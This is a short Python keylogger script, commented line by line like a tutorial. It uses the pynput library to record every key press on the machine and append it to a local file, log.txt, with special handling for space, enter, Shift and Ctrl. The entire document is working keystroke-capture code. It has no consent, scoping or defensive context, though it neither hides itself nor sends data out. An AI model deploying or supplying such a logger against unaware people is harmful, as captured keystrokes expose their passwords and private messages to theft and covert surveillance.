# Importing the Listener class from the pynput.keyboard module
from pynput.keyboard import Listener
# Function to write the captured key to a file
def write_to_file(key):
    letter = str(key)  # Convert the key object to a string
    letter = letter.replace("'", "")  # Remove single quotes around character keys

    # Handling special keys and replacing them with appropriate values
    if letter == 'Key.space':  # Replace space key with an actual space
        letter = ' '
    if letter == 'Key.shift_r':  # Ignore the right Shift key
        letter = ''
    if letter == "Key.ctrl_l":  # Ignore the left Control key
        letter = ""
    if letter == "Key.enter":  # Replace Enter key with a newline
        letter = "\n"
        
    # Open the file in append mode and write the captured key
    with open("log.txt", 'a') as f:
        f.write(letter)

# Creating a listener instance that listens for key presses and calls write_to_file
with Listener(on_press=write_to_file) as l:
    l.join()  # Start the listener and keep it running
